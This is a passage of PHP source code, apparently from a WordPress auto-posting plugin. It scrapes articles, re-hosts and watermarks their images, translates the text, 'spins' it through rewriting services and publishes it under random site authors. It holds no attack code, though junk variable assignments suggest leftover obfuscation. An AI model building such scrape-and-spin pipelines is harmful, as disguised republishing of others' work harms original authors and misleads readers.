    return $temp_imgs;
}
function insertArticle($Article, $config, $options, $url, $baseUrl, $time, $tags, $users, $filterAtag, $downAttach, $print, $insertContent = NULL, $customStyle = NULL, $recordId = NULL)
{
    if (checkUrlPost($config["id"], $url) > 0) return 0;
    $download_attachs  = json_decode($config["download_img"]);
    if (!is_array($download_attachs)) {
        $download_attachs    = array();
        $download_attachs[0] = $config["download_img"];
        $download_attachs[1] = 0;
    }
    $img_insert_attachment  = json_decode($config["img_insert_attachment"]);
    if (!is_array($img_insert_attachment)) {
        $img_insert_attachment    = array();
        $img_insert_attachment[0] = $config["img_insert_attachment"];
        $img_insert_attachment[1]                = 0;
        $img_insert_attachment[2]                = 0;
        $img_insert_attachment[3] = 0;
    }
    if ($download_attachs[0] == 1 || $downAttach) {
        $useP = json_decode($config["proxy"]);
        global $proxy;
    }
    if ($download_attachs[0] == 1) {
        global $Flickr, $Qiniu, $upyunOption;
        $minWidth     = get_option("wp_autopost_downImgMinWidth");
        $downImgTimeOut      = get_option("wp_autopost_downImgTimeOut");
        $downImgFailsNotPost = get_option("wp_autopost_downImgFailsNotPost");
        $xbnytyggt                     = "downloadedAtagImgInfo";
        if ($img_insert_attachment[0] == 4) {
            $upyun = new apUpYun($upyunOption["bucket"], $upyunOption["operator_user_name"], $upyunOption["operator_password"]);
        }
        $downloadedImgInfo     = array();
        $downloadedAtagImgInfo                   = array();
        $UploadedFlickr  = array();
        $UploadedFlickrNum = 0;
        $UploadedQiniu     = array();
        $UploadedQiniuNum      = 0;
        $UploadedUpyun    = array();
        $UploadedUpyunNum  = 0;
        $temp_imgs    = null;
        if (has_downloaded_temp_img($config["id"], $url)) {
            $temp_imgs                = get_downloaded_temp_imgs($config["id"], $url);
        }
        $i = -1;
        $dom      = str_get_html_ap($Article[1]);
        foreach ($dom->find("img") as $domImg) {
            $i++;
            $imgUrl = $domImg->src;
            if (stripos($imgUrl, "http") === false) {
                $imgUrl = getAbsUrl($imgUrl, $baseUrl, $url);
            }
            $canDownImgUrl = true;
            if ($temp_imgs != null) {
                if ($temp_imgs[$imgUrl]["downloaded_url"] != null) {
                    $canDownImgUrl = false;
                    if ($print)
                        printInfo("<p>Image : " . $imgUrl . " already downloaded, the downloaded url is <a href=\"" . $temp_imgs[$imgUrl]["downloaded_url"] . "\" target=\"_blank\">" . $temp_imgs[$imgUrl]["downloaded_url"] . "</a></p>");
                    $downloadedImgUrl = $temp_imgs[$imgUrl]["downloaded_url"];
                    $downloadedImgInfo[$i]["url"]        = $downloadedImgUrl;
                    $downloadedImgInfo[$i]["file_path"] = $temp_imgs[$imgUrl]["file_path"];
                    $downloadedImgInfo[$i]["file_name"]  = $temp_imgs[$imgUrl]["file_name"];
                    $downloadedImgInfo[$i]["post_mime_type"] = $temp_imgs[$imgUrl]["mime_type"];
                    $domImg->src = $downloadedImgUrl;
                    if ($temp_imgs[$imgUrl]["save_type"] == 2) {
                        $ghalnjiuw   = "UploadedFlickrNum";
                        $UploadedFlickr[$UploadedFlickrNum] = recoveryUploadedFlickr($temp_imgs[$imgUrl]["local_key"], $temp_imgs[$imgUrl]["remote_key"]);
                        $UploadedFlickrNum++;
                    } elseif ($temp_imgs[$imgUrl]["save_type"] == 3) {
                        $xcdivulsdplc   = "UploadedQiniu";
                        $kgndbfc                = "UploadedQiniuNum";
                        $UploadedQiniu[$UploadedQiniuNum]["key"] = $temp_imgs[$imgUrl]["remote_key"];
                        $UploadedQiniuNum++;
                    } elseif ($temp_imgs[$imgUrl]["save_type"] == 4) {
                        $UploadedUpyun[$UploadedUpyunNum]["key"] = $temp_imgs[$imgUrl]["remote_key"];
                        $UploadedUpyunNum++;
                    }
                }
            }
            if ($canDownImgUrl) {
                if ($print)
                    printInfo("<p>Begin download image : " . $imgUrl . "</p>");
                $downloadedImgInfo[$i] = post_img_handle_ap::down_remote_img($imgUrl, $url, $minWidth, $useP[0], $proxy, $downImgTimeOut);
                $downloadedImgUrl                                   = "";
            }
            if ($canDownImgUrl && ($downloadedImgInfo[$i]["file_path"] == "" || $downloadedImgInfo[$i]["file_path"] == null)) {
                if ($downloadedImgInfo[$i]["url"] == "" || $downloadedImgInfo[$i]["url"] == null) {
                    if ($downImgFailsNotPost == "1") {
                        $logId = errorLog($config["id"], $url, 16, "<br/>Remote Image URL :" . $imgUrl);
                        updateConfigErr($config["id"], $logId);
                        if ($print)
                            printInfo("<p><span class=\"red\">" . __("Download remote image failed will not post", "wp-autopost") . "</span></p>");
                        return 0;
                    } else {
                        $logId = errorLog($config["id"], $url, 9, "<br/>Remote Image URL :" . $imgUrl);
                        updateConfigErr($config["id"], $logId);
                        if ($print)
                            printInfo("<p><span class=\"red\">" . __("Download remote images fails, use the original image URL", "wp-autopost") . "</span></p>");
                    }
                } else {
                    if ($print)
                        printInfo("<p>" . __("Image is too small, use the original image URL", "wp-autopost") . "</p>");
                }
            } elseif ($canDownImgUrl) {
                $downloadedImgUrl = $downloadedImgInfo[$i]["url"];
                if ($img_insert_attachment[2] == 1) {
                    if ($print)
                        printInfo("<p>Begin add watermark on image : " . $downloadedImgInfo[$i]["file_path"] . "</p>");
                    WP_Autopost_Watermark::do_watermark_on_file($downloadedImgInfo[$i]["file_path"]);
                }
                if ($img_insert_attachment[0] == 0) {
                    insert_downloaded_temp_img($config["id"], $url, $img_insert_attachment[0], $imgUrl, $downloadedImgUrl, $downloadedImgInfo[$i]);
                } elseif ($img_insert_attachment[0] == 1) {
                    insert_downloaded_temp_img($config["id"], $url, $img_insert_attachment[0], $imgUrl, $downloadedImgUrl, $downloadedImgInfo[$i]);
                } elseif ($img_insert_attachment[0] == 2) {
                    if ($print)
                        printInfo("<p>Begin upload to Flickr on image : " . $downloadedImgInfo[$i]["file_path"] . "</p>");
                    if ($Flickr["oauth_token"] == "") {
                        if ($print)
                            printInfo("<p><span class=\"red\">" . __("Save the images to Flickr requires login to your Flickr account and authorize the plugin to connect to your account!", "wp-autopost") . "</span></p>");
                    } else {
                        $UploadedFlickr[$UploadedFlickrNum] = uploadtoflickr($downloadedImgInfo[$i]["file_path"], $downloadedImgInfo[$i]["url"], $Article[0] . $i);
                        if ($UploadedFlickr[$UploadedFlickrNum]["status"] === false) {
                            $logId = errorLog($config["id"], $url, 10);
                            updateConfigErr($config["id"], $logId);
                            if ($print)
                                printInfo("<p><span class=\"red\">" . __("Upload image to Flickr fails, use the original image URL", "wp-autopost") . "</span></p>");
                        } else {
                            $ixxkxmiginlm               = "UploadedFlickr";
                            $downloadedImgUrl  = $UploadedFlickr[$UploadedFlickrNum]["url"];
                            insert_downloaded_temp_img_for_flickr($config["id"], $url, $img_insert_attachment[0], $imgUrl, $downloadedImgUrl, $downloadedImgInfo[$i], $UploadedFlickr[$UploadedFlickrNum]);
                        }
                        $UploadedFlickrNum++;
                    }
                } elseif ($img_insert_attachment[0] == 3) {
                    if ($print)
                        printInfo("<p>Begin upload to Qiniu on image : " . $downloadedImgInfo[$i]["file_path"] . "</p>");
                    if ($Qiniu["set_ok"] != 1) {
                        if ($print)
                            printInfo("<p><span class=\"red\">" . __("Save the images to Qiniu requires set correctly in Qiniu Options!", "wp-autopost") . "</span></p>");
                    } else {
                        $UploadedQiniu[$UploadedQiniuNum] = uploadtoqiniu($downloadedImgInfo[$i]["file_path"], $downloadedImgInfo[$i]["url"], $Qiniu["bucket"], $Qiniu["domain"]);
                        if ($UploadedQiniu[$UploadedQiniuNum]["status"] === false) {
                            $logId = errorLog($config["id"], $url, 11);
                            updateConfigErr($config["id"], $logId);
                            if ($print)
                                printInfo("<p><span class=\"red\">" . __("Upload image to Qiniu fails, use the original image URL", "wp-autopost") . "</span></p>");
                        } else {
                            $downloadedImgUrl   = $UploadedQiniu[$UploadedQiniuNum]["url"];
                            $key = $UploadedQiniu[$UploadedQiniuNum]["key"];
                            insert_downloaded_temp_img($config["id"], $url, $img_insert_attachment[0], $imgUrl, $downloadedImgUrl, $downloadedImgInfo[$i], $key, $key);
                        }
                        $UploadedQiniuNum++;
                    }
                } elseif ($img_insert_attachment[0] == 4) {
                    if ($print)
                        printInfo("<p>Begin upload to Upyun on image : " . $downloadedImgInfo[$i]["file_path"] . "</p>");
                    if ($upyunOption["set_ok"] != 1) {
                        if ($print)
                            printInfo("<p><span class=\"red\">" . __("Save the images to Upyun requires set correctly in Upyun Options!", "wp-autopost") . "</span></p>");
                    } else {
                        $UploadedUpyun[$UploadedUpyunNum] = uploadtoUpyun($downloadedImgInfo[$i]["file_path"], $downloadedImgInfo[$i]["url"], $upyun, $upyunOption);
                        if ($UploadedUpyun[$UploadedUpyunNum]["status"] === false) {
                            $logId = errorLog($config["id"], $url, 12);
                            updateConfigErr($config["id"], $logId);
                            if ($print)
                                printInfo("<p><span class=\"red\">" . __("Upload image to Upyun fails, use the original image URL", "wp-autopost") . "</span></p>");
                        } else {
                            $downloadedImgUrl = $UploadedUpyun[$UploadedUpyunNum]["url"];
                            $key            = $UploadedUpyun[$UploadedUpyunNum]["key"];
                            insert_downloaded_temp_img($config["id"], $url, $img_insert_attachment[0], $imgUrl, $downloadedImgUrl, $downloadedImgInfo[$i], $key, $key);
                        }
                        $UploadedUpyunNum++;
                    }
                } else {
                }
                $domImg->src = $downloadedImgUrl;
            }
            $parent = $domImg->parent();
            if ($parent->tag == "a") {
                $aHref = $parent->href;
                if (stripos($aHref, "http") === false) {
                    if (!(stripos($aHref, "javascript") === false))
                        continue;
                    if (trim($aHref) == "\x23")
                        continue;
                    $aHref               = getAbsUrl($aHref, $baseUrl, $url);
                }
                if ($aHref == $imgUrl) {
                    if ($downloadedImgUrl != "") {
                        $parent->href = $downloadedImgUrl;
                    }
                } else {
                    if (isImageURL($aHref, $url, $useP[0], $proxy)) {
                        $ywgjlnhgwr                  = "i";
                        $canDownAtagImgUrl = true;
                        if ($temp_imgs != null) {
                            if ($temp_imgs[$aHref]["downloaded_url"] != null) {
                                $canDownAtagImgUrl = false;
                                if ($print)
                                    printInfo("<p>Image : " . $aHref . " already downloaded, the downloaded url is <a href=\"" . $temp_imgs[$aHref]["downloaded_url"] . "\" target=\"_blank\">" . $temp_imgs[$aHref]["downloaded_url"] . "</a></p>");
                                $downloadedAtagImgUrl = $temp_imgs[$aHref]["downloaded_url"];
                                $downloadedAtagImgInfo[$i]["url"]  = $downloadedAtagImgUrl;
                                $downloadedAtagImgInfo[$i]["file_path"] = $temp_imgs[$aHref]["file_path"];
                                $downloadedAtagImgInfo[$i]["file_name"]  = $temp_imgs[$aHref]["file_name"];
                                $downloadedAtagImgInfo[$i]["post_mime_type"] = $temp_imgs[$aHref]["mime_type"];
                                $parent->href    = $downloadedAtagImgUrl;
                                if ($temp_imgs[$aHref]["save_type"] == 2) {
                                    $UploadedFlickr[$UploadedFlickrNum] = recoveryUploadedFlickr($temp_imgs[$aHref]["local_key"], $temp_imgs[$aHref]["remote_key"]);
                                    $UploadedFlickrNum++;
                                } elseif ($temp_imgs[$aHref]["save_type"] == 3) {
                                    $UploadedQiniu[$UploadedQiniuNum]["key"] = $temp_imgs[$aHref]["remote_key"];
                                    $UploadedQiniuNum++;
                                } elseif ($temp_imgs[$aHref]["save_type"] == 4) {
                                    $UploadedUpyun[$UploadedUpyunNum]["key"] = $temp_imgs[$aHref]["remote_key"];
                                    $UploadedUpyunNum++;
                                }
                            }
                        }
                        if ($canDownAtagImgUrl) {
                            if ($print)
                                printInfo("<p>Begin download image : " . $aHref . "</p>");
                            $downloadedAtagImgInfo[$i] = post_img_handle_ap::down_remote_img($aHref, $url, $minWidth, $useP[0], $proxy, $downImgTimeOut);
                            $downloadedAtagImgUrl                                             = "";
                        }
                        if ($canDownAtagImgUrl && ($downloadedAtagImgInfo[$i]["file_path"] == "" || $downloadedAtagImgInfo[$i]["file_path"] == null)) {
                            if ($downloadedAtagImgInfo[$i]["url"] == "" || $downloadedAtagImgInfo[$i]["url"] == null) {
                                if ($downImgFailsNotPost == "1") {
                                    $logId = errorLog($config["id"], $url, 16, "<br/>Remote Image URL :" . $aHref);
                                    updateConfigErr($config["id"], $logId);
                                    if ($print)
                                        printInfo("<p><span class=\"red\">" . __("Download remote image failed will not post", "wp-autopost") . "</span></p>");
                                    return 0;
                                } else {
                                    $logId = errorLog($config["id"], $url, 9, "<br/>Remote Image URL :" . $aHref);
                                    updateConfigErr($config["id"], $logId);
                                    if ($print)
                                        printInfo("<p><span class=\"red\">" . __("Download remote images fails, use the original image URL", "wp-autopost") . "</span></p>");
                                }
                            } else {
                                if ($print)
                                    printInfo("<p>" . __("Image is too small, use the original image URL", "wp-autopost") . "</p>");
                            }
                        } elseif ($canDownAtagImgUrl) {
                            $downloadedAtagImgUrl = $downloadedAtagImgInfo[$i]["url"];
                            if ($img_insert_attachment[2] == 1) {
                                if ($print)
                                    printInfo("<p>Begin add watermark on image : " . $downloadedAtagImgInfo[$i]["file_path"] . "</p>");
                                WP_Autopost_Watermark::do_watermark_on_file($downloadedAtagImgInfo[$i]["file_path"]);
                            }
                            if ($img_insert_attachment[0] == 0) {
                                insert_downloaded_temp_img($config["id"], $url, $img_insert_attachment[0], $aHref, $downloadedAtagImgUrl, $downloadedAtagImgInfo[$i]);
                            } elseif ($img_insert_attachment[0] == 1) {
                                insert_downloaded_temp_img($config["id"], $url, $img_insert_attachment[0], $aHref, $downloadedAtagImgUrl, $downloadedAtagImgInfo[$i]);
                            } elseif ($img_insert_attachment[0] == 2) {
                                if ($print)
                                    printInfo("<p>Begin upload to Flickr on image : " . $downloadedAtagImgInfo[$i]["file_path"] . "</p>");
                                if ($Flickr["oauth_token"] == "") {
                                    if ($print)
                                        printInfo("<p><span class=\"red\">" . __("Save the images to Flickr requires login to your Flickr account and authorize the plugin to connect to your account!", "wp-autopost") . "</span></p>");
                                } else {
                                    $UploadedFlickr[$UploadedFlickrNum] = uploadtoflickr($downloadedAtagImgInfo[$i]["file_path"], $Article[0] . $i);
                                    if ($UploadedFlickr[$UploadedFlickrNum]["status"] === false) {
                                        $logId = errorLog($config["id"], $url, 10);
                                        updateConfigErr($config["id"], $logId);
                                        if ($print)
                                            printInfo("<p><span class=\"red\">" . __("Upload image to Flickr fails, use the original image URL", "wp-autopost") . "</span></p>");
                                    } else {
                                        $downloadedAtagImgUrl = $UploadedFlickr[$UploadedFlickrNum]["url"];
                                        insert_downloaded_temp_img_for_flickr($config["id"], $url, $img_insert_attachment[0], $aHref, $downloadedAtagImgUrl, $downloadedAtagImgInfo[$i], $UploadedFlickr[$UploadedFlickrNum]);
                                    }
                                    $UploadedFlickrNum++;
                                }
                            } elseif ($img_insert_attachment[0] == 3) {
                                if ($print)
                                    printInfo("<p>Begin upload to Qiniu on image : " . $downloadedAtagImgInfo[$i]["file_path"] . "</p>");
                                if ($Qiniu["set_ok"] != 1) {
                                    if ($print)
                                        printInfo("<p><span class=\"red\">" . __("Save the images to Qiniu requires set correctly in Qiniu Options!", "wp-autopost") . "</span></p>");
                                } else {
                                    $UploadedQiniu[$UploadedQiniuNum] = uploadtoqiniu($downloadedAtagImgInfo[$i]["file_path"], $downloadedAtagImgInfo[$i]["url"], $Qiniu["bucket"], $Qiniu["domain"]);
                                    if ($UploadedQiniu[$UploadedQiniuNum]["status"] === false) {
                                        $logId = errorLog($config["id"], $url, 11);
                                        updateConfigErr($config["id"], $logId);
                                        if ($print)
                                            printInfo("<p><span class=\"red\">" . __("Upload image to Qiniu fails, use the original image URL", "wp-autopost") . "</span></p>");
                                    } else {
                                        $downloadedAtagImgUrl = $UploadedQiniu[$UploadedQiniuNum]["url"];
                                        $key               = $UploadedQiniu[$UploadedQiniuNum]["key"];
                                        insert_downloaded_temp_img($config["id"], $url, $img_insert_attachment[0], $aHref, $downloadedAtagImgUrl, $downloadedAtagImgInfo[$i], $key, $key);
                                    }
                                    $UploadedQiniuNum++;
                                }
                            } elseif ($img_insert_attachment[0] == 4) {
                                if ($print)
                                    printInfo("<p>Begin upload to Upyun on image : " . $downloadedAtagImgInfo[$i]["file_path"] . "</p>");
                                if ($upyunOption["set_ok"] != 1) {
                                    if ($print)
                                        printInfo("<p><span class=\"red\">" . __("Save the images to Upyun requires set correctly in Upyun Options!", "wp-autopost") . "</span></p>");
                                } else {
                                    $UploadedUpyun[$UploadedUpyunNum] = uploadtoUpyun($downloadedAtagImgInfo[$i]["file_path"], $downloadedAtagImgInfo[$i]["url"], $upyun, $upyunOption);
                                    if ($UploadedUpyun[$UploadedUpyunNum]["status"] === false) {
                                        $logId               = errorLog($config["id"], $url, 12);
                                        updateConfigErr($config["id"], $logId);
                                        if ($print)
                                            printInfo("<p><span class=\"red\">" . __("Upload image to Upyun fails, use the original image URL", "wp-autopost") . "</span></p>");
                                    } else {
                                        $downloadedAtagImgUrl = $UploadedUpyun[$UploadedUpyunNum]["url"];
                                        $key = $UploadedUpyun[$UploadedUpyunNum]["key"];
                                        insert_downloaded_temp_img($config["id"], $url, $img_insert_attachment[0], $aHref, $downloadedAtagImgUrl, $downloadedAtagImgInfo[$i], $key, $key);
                                    }
                                    $UploadedUpyunNum++;
                                }
                            } else {
                            }
                            $parent->href = $downloadedAtagImgUrl;
                        }
                    }
                }
            }
            unset($parent);
        }
        $Article[1] = $dom->save();
        $dom->clear();
        unset($dom);
        if ($img_insert_attachment[0] == 4) {
            unset($upyun);
        }
    }
    $AleadyDownloadFeatured   = false;
    $AleadySetFeatured = false;
    if ($Article[12] != "" && $Article[12] != null) {
        if (!isset($downImgFailsNotPost)) {
            $downImgFailsNotPost = get_option("wp_autopost_downImgFailsNotPost");
        }
        if ($print)
            printInfo("<p>Begin download the featued image : " . $Article[12] . "</p>");
        $featuredImgInfo = down_featured_img($Article[12], $url, 1, $useP[0], $proxy, 120);
        if ($featuredImgInfo["file_path"] == "" || $featuredImgInfo["file_path"] == null) {
            if ($downImgFailsNotPost == "1") {
                $logId = errorLog($config["id"], $url, 16, "<br/>Remote Image URL :" . $Article[12]);
                updateConfigErr($config["id"], $logId);
                if ($print)
                    printInfo("<p><span class=\"red\">" . __("Download remote image failed will not post", "wp-autopost") . "</span></p>");
                return 0;
            } else {
                $pmsnsbg = "print";
                if ($print)
                    printInfo("<p><span class=\"red\">" . __("Download remote featued images fails", "wp-autopost") . "</span></p>");
            }
        } else {
            $AleadyDownloadFeatured = true;
        }
    }
    if ($download_attachs[0] == 0 && $img_insert_attachment[1] > 0 && !$AleadyDownloadFeatured) {
        $minWidth  = get_option("wp_autopost_downImgMinWidth");
        $downImgTimeOut  = get_option("wp_autopost_downImgTimeOut");
        $downImgFailsNotPost                 = get_option("wp_autopost_downImgFailsNotPost");
        $downloadedImgInfo  = array();
        $dom                  = str_get_html_ap($Article[1]);
        $domImages  = $dom->find("img");
        $imageNums = count($domImages);
        $featuredImgIndex    = intval($img_insert_attachment[1]);
        if ($featuredImgIndex >= $imageNums)
            $featuredImgIndex = $imageNums;
        $featuredImgIndex = $featuredImgIndex - 1;
        if ($imageNums > 0) {
            $imgUrl               = $domImages[$featuredImgIndex]->src;
            if (stripos($imgUrl, "http") === false) {
                $imgUrl = getAbsUrl($imgUrl, $baseUrl, $url);
            }
            if ($print)
                printInfo("<p>Begin download image : " . $imgUrl . "</p>");
            $downloadedImgInfo[0] = post_img_handle_ap::down_remote_img($imgUrl, $url, 1, $useP[0], $proxy, $downImgTimeOut);
            if ($downloadedImgInfo[0]["file_path"] == "" || $downloadedImgInfo[0]["file_path"] == null) {
                if ($downImgFailsNotPost == "1") {
                    $logId = errorLog($config["id"], $url, 16, "<br/>Remote Image URL :" . $imgUrl);
                    updateConfigErr($config["id"], $logId);
                    if ($print)
                        printInfo("<p><span class=\"red\">" . __("Download remote image failed will not post", "wp-autopost") . "</span></p>");
                    return 0;
                } else {
                    $logId           = errorLog($config["id"], $url, 9, "<br/>Remote Image URL :" . $imgUrl);
                    updateConfigErr($config["id"], $logId);
                    if ($print)
                        printInfo("<p><span class=\"red\">" . __("Download remote images fails, use the original image URL", "wp-autopost") . "</span></p>");
                }
            } else {
                $domImages[$featuredImgIndex]->src = $downloadedImgInfo[0]["url"];
                $Article[1]                              = $dom->save();
            }
        }
        $dom->clear();
        unset($dom);
    }

    $last_updated_time     = $config["93202512f7ba54e02ffd12f375053b88"];
    $should_updated_time = $config["93f0198fad647e69db36ac56e3d66ce1"];
    if ($downAttach) {
        global $returnFile;
        $returnFile                   = array();
        $Article[1] = processDownAttach($Article[1], $filterAtag, $baseUrl, $url, $useP[0], $proxy);
    }
    $auto_set = json_decode($config["auto_tags"]);
    if (!is_array($auto_set)) {
        $auto_set     = array();
        $auto_set[0] = $config["auto_tags"];
        $auto_set[1]                = 0;
        $auto_set[2]                = 0;
    }
    $post_status = "publish";
    switch ($auto_set[2]) {
        case 0:
            $post_status = "publish";
            break;
        case 1:
            $post_status = "draft";
            break;
        case 2:
            $post_status = "pending";
            break;
    }
    $customFields                = array();
    $add_source_url = json_decode($config["add_source_url"]);
    if ($add_source_url[0] == 1) {
        $customFields[$add_source_url[1]] = $url;
    }
    if ($Article[5] != null) {
        $custom_fields = json_decode($Article[5]);
        if (count($custom_fields) > 0) {
            foreach ($custom_fields as $key => $value) {
                $customFields[$key] = $value;
            }
        }
    }
    if (($config["custom_field"]) != null && ($config["custom_field"]) != "") {
        $custom_fields                = json_decode($config["custom_field"]);
        foreach ($custom_fields as $key => $value) {
            $customFields[$key] = $value;
        }
    }
    $post_title    = $Article[0];
    $post_content    = $Article[1];
    $categorys = explode(",", $config["cat"]);
    $cats = array();
    foreach ($categorys as $cat) {
        $cats[] = intval($cat);
    }
    if ($Article[4] > 0)
        $post_date = date("Y-m-d H:i:s", $Article[4]);
    else
        $post_date = date("Y-m-d H:i:s", $time);
    $post_type              = "post";
    if ($config["post_type"] == "page") {
        $post_type = "page";
        $cats    = null;
    } else {
        $post_type = $config["post_type"];
    }
    if ($auto_set[1] > 0) {
        $excerpt = getFirstP($post_content, $auto_set[1]);
    }
    if ($Article[9] != null && $Article[9] != "") {
        $excerpt = getPlainText($Article[9]);
    }
    $author = $config["author"];
    if ($config["author"] == 0) {
        $author = $users[rand(0, count($users) - 1)]->ID;
    }
    if ($config["93f0198fad647e69db36ac56e3d66ce1"] == $last_updated_time) {
        $use_trans    = json_decode($config["use_trans"]);
        if (!is_array($use_trans)) {
            $use_trans    = array();
            $use_trans[0] = 0;
            $use_trans[1] = "";
            $use_trans[2]                    = "";
            $use_trans[3] = -1;
        }
        if ($use_trans[0] == 1) {
            if ($print)
                printInfo("<p>Begin Translated By Microsoft Translator</p>");
            $Article = microsoftTranslation($Article, $use_trans, $excerpt);
            if ($Article[8] == null) {
                $dom  = str_get_html_ap($Article[7]);
                foreach ($dom->find("[title]") as $e) {
                    $e->title = $Article[6];
                }
                foreach ($dom->find("[alt]") as $e) {
                    $e->alt = $Article[6];
                }
                $Article[7] = $dom->save();
                $dom->clear();
                unset($dom);
                if ($use_trans[3] == -1 || $use_trans[3] == -2 || $use_trans[3] == -3) {
                    $post_title    = $Article[6];
                    $post_content = $Article[7];
                    if ($excerpt != null && $excerpt != "")
                        $excerpt = $Article[10];
                } else {
                    $trans_cats = explode(",", $use_trans[3]);
                    if ($excerpt != null && $excerpt != "")
                        $trans_excerpt = $Article[10];
                    $trans_tags_to_add             = array();
                    if ($auto_set[0] == 1) {
                        $trans_tags_to_add = getTags($tags, $Article[7], $config["whole_word"]);
                    }
                    $trans_post                  = array(
                        "post_title" => $Article[6],
                        "post_content" => $Article[7],
                        "post_excerpt" => $trans_excerpt,
                        "post_status" => $post_status,
                        "post_author" => $author,
                        "post_category" => $trans_cats,
                        "post_date" => $post_date,
                        "tags_input" => $trans_tags_to_add,
                        "post_type" => $post_type
                    );
                    $trans_post_id = wp_insert_post($trans_post);
                }
            } else {
                $info = __("Microsoft Translator Error", "wp-autopost") . " : " . $Article[8];
                $logId   = errorLog($config["id"], $url, 99, $info);
                updateConfigErr($config["id"], $logId);
                if ($print)
                    printInfo("<p><span class=\"red\">" . $info . "</span></p>");
                return 0;
            }
        }
        $tags_to_add = array();
        if ($auto_set[0] == 1) {
            $tags_to_add = getTags($tags, $post_content, $config["whole_word"]);
        }
        if ($Article[11] != null && $Article[11] != "") {
            $fetched_tags = json_decode($Article[11]);
            foreach ($fetched_tags as $tag) {
                $tags_to_add[] = $tag;
            }
        }
        $rewrite = json_decode($config["use_rewrite"]);
        if (!is_array($rewrite)) {
            $rewrite = array();
            $rewrite[0] = 0;
        }
        if ($rewrite[0] == 1) {
            if ($print)
                printInfo("<p>Begin Rewrited By Microsoft Translator</p>");
            $dom                  = str_get_html_ap($post_content);
            $tempImg  = array();
            $imgNum = 0;
            foreach ($dom->find("img,iframe,embed,object,video") as $img) {
                $imgNum++;
                $key                  = "IMG" . $imgNum . "TAG";
                $tempImg[$key] = $img->outertext;
                $img->outertext                               = " " . $key . " ";
            }
            $p_tags  = $dom->find("p");
            $to_rewrite_str = "";
            foreach ($p_tags as $p_tag) {
                $to_rewrite_str .= " PTAG " . $p_tag->innertext . " PENDTAG ";
            }
            $to_rewrite_str    = strip_tags($to_rewrite_str, "<br><br/><br />");
            $find      = array();
            $replace      = array();
            $find[]       = "PTAG";
            $replace[] = "<p>";
            $find[]                   = "PENDTAG";
            $replace[]    = "</p>";
            foreach ($tempImg as $key => $value) {
                $find[] = $key;
                $replace[]                   = "<" . $key . "></" . $key . ">";
            }
            $pyypubw                       = "to_rewrite_str";
            $to_rewrite_str = str_ireplace($find, $replace, $to_rewrite_str);
            unset($find);
            unset($replace);
            $spin = microsoftTranslationSpin($to_rewrite_str, $rewrite[1], $rewrite[2]);
            if ($spin["status"] == "Success") {
                $find            = array();
                $replace            = array();
                foreach ($tempImg as $key => $value) {
                    $find[] = "<" . $key . "></" . $key . ">";
                    $replace[]   = $value;
                }
                $rewrited_p_str = str_ireplace($find, $replace, $spin["text"]);
            } else {
                $logId = errorLog($config["id"], $url, 14, $spin["error"]);
                updateConfigErr($config["id"], $logId);
            }
            if ($spin["status"] == "Success") {
                $rewrited_dom = str_get_html_ap($rewrited_p_str);
                $rewrited_p_tags               = $rewrited_dom->find("p");
                $Pnum  = count($p_tags);
                for ($i = 0; $i < $Pnum; $i++) {
                    $szgsqmfouqq                                                              = "i";
                    $p_tags[$i]->innertext = $rewrited_p_tags[$i]->innertext;
                }
                $post_content = $dom->save();
                $find1   = array();
                $replace1               = array();
                foreach ($tempImg as $key => $value) {
                    $find1[] = $key;
                    $replace1[]      = $value;
                }
                $post_content = str_ireplace($find1, $replace1, $post_content);
                $rewrited_dom->clear();
                unset($rewrited_dom);
                unset($rewrited_p_tags);
            }
            if ($rewrite[3] == 1) {
                $spinTitle             = microsoftTranslationSpin($post_title, $rewrite[1], $rewrite[2]);
                if ($spinTitle["status"] == "Success") {
                    $post_title = $spinTitle["text"];
                } else {
                    $logId = errorLog($config["id"], $url, 14, $spinTitle["error"]);
                    updateConfigErr($config["id"], $logId);
                }
                unset($spinTitle);
            }
            unset($tempImg);
            unset($to_rewrite_str);
            unset($rewrited_p_str);
            unset($p_tags);
            $dom->clear();
            unset($dom);
            unset($spin);
        } elseif ($rewrite[0] == 2) {
            if ($print)
                printInfo("<p>Begin Rewrited By WordAi</p>");
            $dom     = str_get_html_ap($post_content);
            $tempImg   = array();
            $imgNum = 0;
            foreach ($dom->find("img,iframe,embed,object,video") as $img) {
                $imgNum++;
                $key = "IMG" . $imgNum . "TAG";
                $tempImg[$key] = $img->outertext;
                $img->outertext = " " . $key . " ";
            }
            $p_tags  = $dom->find("p");
            $to_rewrite_str = "";
            foreach ($p_tags as $p_tag) {
                $to_rewrite_str .= " PTAG " . $p_tag->innertext . " PENDTAG ";
            }
            $to_rewrite_str               = strip_tags($to_rewrite_str);
            $spin = autopostWordAi::getSpinText($rewrite[1], $rewrite[2], $rewrite[3], $to_rewrite_str, $rewrite[4], $rewrite[5], $rewrite[6], $rewrite[7]);
            $spin = json_decode($spin);
            if ($spin->status == "Success") {
                $find                  = array();
                $replace     = array();
                $find[] = "PTAG";
                $replace[]                 = "<p>";
                $find[]   = "PENDTAG";
                $replace[]  = "</p>";
                $rewrited_p_str                     = str_ireplace($find, $replace, $spin->text);
            } else {
                $logId = errorLog($config["id"], $url, 13, $spin->error);
                updateConfigErr($config["id"], $logId);
            }
            if ($spin->status == "Success") {
                $rewrited_dom             = str_get_html_ap($rewrited_p_str);
                $rewrited_p_tags  = $rewrited_dom->find("p");
                $Pnum = count($p_tags);
                for ($i = 0; $i < $Pnum; $i++) {
                    $p_tags[$i]->innertext = $rewrited_p_tags[$i]->innertext;
                }
                $post_content  = $dom->save();
                $find1 = array();
                $replace1     = array();
                foreach ($tempImg as $key => $value) {
                    $find1[] = $key;
                    $replace1[]  = $value;
                }
                $post_content = str_ireplace($find1, $replace1, $post_content);
                $rewrited_dom->clear();
                unset($rewrited_dom);
                unset($rewrited_p_tags);
            }
            if ($rewrite[8] == 1) {
                $spinTitle = autopostWordAi::getSpinText($rewrite[1], $rewrite[2], $rewrite[3], $post_title, $rewrite[4], $rewrite[5], $rewrite[6], $rewrite[7]);
                $spinTitle  = json_decode($spinTitle);
                if ($spinTitle->status == "Success") {
                    $post_title = $spinTitle->text;
                } else {
                    $logId = errorLog($config["id"], $url, 13, $spinTitle->error);
                    updateConfigErr($config["id"], $logId);
                }
                unset($spinTitle);
            }
            unset($tempImg);
            unset($to_rewrite_str);
            unset($rewrited_p_str);
            unset($p_tags);
            $dom->clear();
            unset($dom);
            unset($spin);
        } elseif ($rewrite[0] == 3) {
            if ($print)
                printInfo("<p>Begin Rewrited By Spin Rewriter</p>");
            $dom = str_get_html_ap($post_content);
            $protected_terms = "";
            $tempImg   = array();
            $imgNum  = 0;
            foreach ($dom->find("img,iframe,embed,object,video") as $img) {
